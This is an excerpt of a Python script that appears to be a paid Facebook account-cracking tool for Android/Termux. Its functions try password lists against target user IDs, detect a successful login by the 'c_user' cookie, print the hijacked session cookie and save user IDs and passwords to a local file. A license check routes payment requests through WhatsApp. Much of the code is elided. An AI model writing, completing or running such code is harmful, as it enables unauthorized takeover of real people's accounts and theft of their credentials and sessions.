...
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲★❳ AUTHOR   : ILYAS ADBI          │ 
\033[1;37m│ ❲★❳ GITHUB   : Cabdulahi100             |
\033[1;37m│ ❲★❳ WHATSAPP : +252 682390000        │
...
def main():
    ...
    if sh =='5':
       ...
       menu()
    if sh =='6':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100076106394240')
       main()  
...
def apk(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[ILYAS] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
            sys.stdout.flush()
...
def mix(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/ILYAS-ABDI-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [ILYAS>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/ILYAS-ABDI-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mYOUR KEY DONE PAID USER ADMIN PERMISSION ILYAS ABDI ALI ')
      msg = str(os.geteuid())
      time.sleep(0.03)
      print()
      pass
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+252682390000?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
